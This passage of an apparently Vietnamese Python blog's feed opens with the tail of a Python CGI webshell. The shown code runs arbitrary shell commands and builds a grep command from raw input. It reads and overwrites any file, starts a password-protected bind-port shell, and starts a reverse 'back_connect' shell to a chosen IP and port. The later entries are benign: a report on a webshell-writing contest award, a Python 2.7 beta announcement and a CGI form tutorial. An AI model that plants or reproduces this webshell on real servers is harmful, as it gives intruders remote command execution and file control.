        &lt;span class="n"&gt;include_pattern&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;include_pattern&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;exclude_pattern&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;exclude_pattern&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;grep -ir &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;search_text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;search_dir&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;include_pattern&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;--include=&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;include_pattern&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;exclude_pattern&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;--include=&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;exclude_pattern&lt;/span&gt;
        &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;run_command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;edit_file&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;file_content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;edit_file_box_visibility&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Cannot open file&amp;quot;&lt;/span&gt;
            &lt;span class="n"&gt;file_content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
            &lt;span class="n"&gt;edit_file_box_visibility&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;None&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;save_file&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file_name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;file_content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file_content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file_content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Successful&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Cannot write to file&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bind_port&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;put_script&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;bind_port&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Popen&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;python &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)],&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pid&lt;/span&gt;
        &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Process ID : &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt; &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;

    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;back_connect&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ip&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;put_script&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;back_connect&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Popen&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;python &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;)],&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pid&lt;/span&gt;
        &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Process ID : &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt; &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;

    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;run_command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;list_files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;run_command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ls -alh &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;cur_dir&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;substitute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ_table&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;get_environ_table&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
                          &lt;span class="n"&gt;uname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;uname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                          &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                          &lt;span class="n"&gt;list_files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;list_files&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                          &lt;span class="n"&gt;cur_dir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cur_dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                          &lt;span class="n"&gt;command_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;command_result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                          &lt;span class="n"&gt;file_content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;file_content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                          &lt;span class="n"&gt;file_name&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                          &lt;span class="n"&gt;edit_file_box_visibility&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;edit_file_box_visibility&lt;/span&gt;
                            &lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
</content><category term="webshell"></category><category term="cgi"></category></entry><entry><title>Trao giải cuộc thi viết webshell bằng Python</title><link href="/2010/05/trao-giai-cuoc-thi-viet-webshell-bang-python.html" rel="alternate"></link><published>2010-05-17T05:17:00+07:00</published><updated>2010-05-17T05:17:00+07:00</updated><author><name>Lê Ngọc Hiếu</name></author><id>tag:None,2010-05-17:/2010/05/trao-giai-cuoc-thi-viet-webshell-bang-python.html</id><summary type="html">&lt;p&gt;Ngày 16/05/2010 tại quán cafe K&amp;amp;K đã diễn ra buổi lễ trao giải cho cuộc thi viết webshell bằng python. Tại buổi lễ, anh Nguyễn Thành Nam là trưởng nhóm Python cho người Việt đã trao giải nhất của cuộc thi cho bạn Phan Đắc Anh Huy …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ngày 16/05/2010 tại quán cafe K&amp;amp;K đã diễn ra buổi lễ trao giải cho cuộc thi viết webshell bằng python. Tại buổi lễ, anh Nguyễn Thành Nam là trưởng nhóm Python cho người Việt đã trao giải nhất của cuộc thi cho bạn Phan Đắc Anh Huy với phần thưởng là 100.000 đồng.&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="/static/webshell_programming_contest.jpg" /&gt;
&lt;p class="caption"&gt;Hình: anh Nguyễn Thành Nam trao giải cho bạn Phan Đắc Anh Huy&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Cuộc thi lần này đã thu hút sự tham gia của nhiều bạn trẻ hơn so với cuộc thi viết game bằng Python lần trước. Theo anh Nam, chất lượng cuộc thi lần này đã khá hơn hẳn lần trước. Điều đó chứng tỏ trình độ lập trình bằng Python và cộng đồng sử dụng Python đã và đang lớn mạnh hơn. Đây cũng chính là mục đích của trang mạng Python cho người Việt được lập ra.&lt;/p&gt;
&lt;p&gt;Sau lễ trao giải, nhóm cũng đã có buổi thảo luận sôi nổi về việc sẽ thúc đẩy sinh hoạt gặp mặt trực tiếp nhằm nâng cao hơn nữa tay nghề. Hy vọng đây sẽ là một hoạt động bổ ích và thiết thực cho các bạn trẻ ham học hỏi. Bạn Hoàng Quốc Thịnh - người đã đoạt giải nhất trong cuộc thi lần trước - chia sẻ:&lt;/p&gt;
&lt;blockquote&gt;
Mình nghĩ không nên lạm dụng việc sinh hoạt trực tuyến nhiều quá, sinh hoạt trực tiếp gặp mặt có điểm lợi hơn đó là việc cái 'lửa' sẽ được tận mắt nhìn thấy và truyền cho nhau. Điều này, sinh hoạt trực tuyến không có được.&lt;/blockquote&gt;
&lt;p&gt;Anh Nam cũng có cùng nhận định như trên và đang chuẩn bị cho những hoạt động đẩy mạnh trong thời gian sắp tới.&lt;/p&gt;
&lt;p&gt;K&amp;amp;K, 15:03 16/05/2010&lt;/p&gt;
</content></entry><entry><title>Python 2.7 beta 1 ra mắt</title><link href="/2010/04/python-27-beta-1-ra-mat.html" rel="alternate"></link><published>2010-04-18T11:00:00+07:00</published><updated>2010-04-18T11:00:00+07:00</updated><author><name>Võ Đức Phương</name></author><id>tag:None,2010-04-18:/2010/04/python-27-beta-1-ra-mat.html</id><summary type="html">&lt;p&gt;Python 2.7 là phiên bản cuối cùng của Python 2 trước khi chuyển sang chế độ chỉ sửa lỗi, không thêm tính năng vào họ phiên bản này nữa. Tương tự như 2.6, phiên bản này sẽ chú trọng vào việc thêm vào những tính năng của Python …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Python 2.7 là phiên bản cuối cùng của Python 2 trước khi chuyển sang chế độ chỉ sửa lỗi, không thêm tính năng vào họ phiên bản này nữa. Tương tự như 2.6, phiên bản này sẽ chú trọng vào việc thêm vào những tính năng của Python 3 (chính xác là Python 3.1). Những cải tiến của phiên bản này bao gồm:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Thêm loại từ điển có sắp xếp&lt;/li&gt;
&lt;li&gt;Thêm một số tính năng cho unittest như bỏ qua kiểm tra hay các phương pháp kiểm định mới.&lt;/li&gt;
&lt;li&gt;Mô đun &lt;tt class="docutils literal"&gt;io&lt;/tt&gt; mới cho tốc độ nhanh hơn&lt;/li&gt;
&lt;li&gt;Tự đánh số các trường với phương pháp &lt;tt class="docutils literal"&gt;str.format()&lt;/tt&gt;&lt;/li&gt;
&lt;li&gt;Mô đun &lt;tt class="docutils literal"&gt;sysconfig&lt;/tt&gt; mới.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;... cùng nhiều thay đổi khác nữa. Thông tin chi tiết về phiên bản này có thể được xem tại:&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://docs.python.org/dev/whatsnew/2.7.html"&gt;Có những gì mới trong Python 2.7&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://svn.python.org/projects/python/tags/r27b1/Misc/NEWS"&gt;Danh sách các thay đổi của Python 2.7&lt;/a&gt;&lt;/p&gt;
</content></entry><entry><title>Lập trình web với Python (4)</title><link href="/2010/03/lap-trinh-web-voi-python-4.html" rel="alternate"></link><published>2010-03-10T05:46:00+07:00</published><updated>2010-03-10T05:46:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2010-03-10:/2010/03/lap-trinh-web-voi-python-4.html</id><summary type="html">&lt;p&gt;Trong kỳ này, chúng ta sẽ xem xét một chương trình CGI có xử lý dữ liệu nhập.&lt;/p&gt;
&lt;p&gt;Ở kỳ trước, chúng ta đã biết cấu trúc chung của một chương trình CGI. Chương trình CGI mà chúng ta dùng làm ví dụ không thật sự hữu dụng vì chúng …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trong kỳ này, chúng ta sẽ xem xét một chương trình CGI có xử lý dữ liệu nhập.&lt;/p&gt;
&lt;p&gt;Ở kỳ trước, chúng ta đã biết cấu trúc chung của một chương trình CGI. Chương trình CGI mà chúng ta dùng làm ví dụ không thật sự hữu dụng vì chúng chỉ xuất giá trị ngẫu nhiên.&lt;/p&gt;
&lt;p&gt;Một chương trình CGI hữu dụng thường sẽ nhận dữ liệu nhập qua các mẫu đơn (form), xử lý các dữ liệu này, và trả về kết quả.&lt;/p&gt;
&lt;p&gt;Các dữ liệu nhập được truyền đến ứng dụng web ở dạng bộ 2 (khóa, giá trị) (key-value pair). Ví dụ nếu chúng ta điền vào một mẫu đơn có trường nhập tên là &lt;strong&gt;name&lt;/strong&gt; và giá trị của nó là &lt;strong&gt;Nguyễn Việt Nam&lt;/strong&gt; thì khóa sẽ là &lt;strong&gt;name&lt;/strong&gt; và giá trị là &lt;strong&gt;Nguyễn Việt Nam&lt;/strong&gt;. Thông thường có hai phương thức truyền dữ liệu đến ứng dụng web là GET và POST.&lt;/p&gt;
&lt;p&gt;Trong phương thức &lt;strong&gt;GET&lt;/strong&gt;, các bộ 2 (khóa, giá trị) này sẽ được truyền qua URL. Với ví dụ ở trên, URL sẽ có dạng &lt;strong&gt;http://host/path?name=Nguyễn+Việt+Nam&lt;/strong&gt;. Bạn đọc sẽ chú ý các điểm quan trọng sau:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Đi ngay phía sau đường dẫn đến ứng dụng CGI là một dấu chấm hỏi (&lt;strong&gt;?&lt;/strong&gt;). Ký tự này dùng để thông báo phần phía sau là dữ liệu nhập.&lt;/li&gt;
&lt;li&gt;Phân cách giữa khóa và giá trị của dữ liệu nhập là dấu bằng (&lt;strong&gt;=&lt;/strong&gt;).&lt;/li&gt;
&lt;li&gt;Khóa và giá trị được chuyển mã theo dạng phù hợp. Chúng ta thấy rằng ký tự khoảng trắng được chuyển thành ký tự cộng (&lt;strong&gt;+&lt;/strong&gt;). Việc chuyển mã này nhằm làm cho URL không chứa các ký tự đặc biệt có thể gây nhầm lẫn.&lt;/li&gt;
&lt;li&gt;Không được nêu rõ trong ví dụ là ký tự phân cách các bộ 2 (khóa, giá trị) là ký tự và (&lt;strong&gt;&amp;amp;&lt;/strong&gt;).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Trong phương thức &lt;strong&gt;POST&lt;/strong&gt;, các bộ 2 (khóa, giá trị) được truyền trong nội dung yêu cầu HTTP, và không hiện rõ cho người dùng.&lt;/p&gt;
&lt;p&gt;Hãy thử nghiệm với chương trình ví dụ sau (đặt tên nó là &lt;strong&gt;fp.py&lt;/strong&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!c:/python26/python&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Content-Type: text/html&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;title&amp;gt;CGI form processing&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;fieldset&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                      &amp;lt;legend&amp;gt;Number guessing game&amp;lt;/legend&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                      &amp;lt;form method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                              &amp;lt;label for=&amp;quot;number&amp;quot;&amp;gt;Enter a number&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                              &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;number&amp;quot; value=&amp;quot;&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                              &amp;lt;input type=&amp;quot;submit&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                      &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;/fieldset&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Kết quả mà chúng ta nhận được là một mẫu đơn như hình:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/cgi/form1.png" /&gt;
&lt;p&gt;Một số điểm quan trọng trong chương trình này là sự sử dụng các thẻ liên quan đến mẫu đơn.&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Trước hết là thẻ &lt;strong&gt;form&lt;/strong&gt; dùng để thông báo sự bắt đầu của một mẫu đơn. Các thuộc tính (attribute) thông thường của thẻ này gồm &lt;strong&gt;method&lt;/strong&gt; và &lt;strong&gt;action&lt;/strong&gt;.&lt;ol class="arabic"&gt;
&lt;li&gt;Thuộc tính &lt;strong&gt;method&lt;/strong&gt; xác định phương thức truyền dữ liệu. Chúng ta có thể sử dụng &lt;tt class="docutils literal"&gt;GET&lt;/tt&gt; hoặc &lt;tt class="docutils literal"&gt;POST&lt;/tt&gt;.&lt;/li&gt;
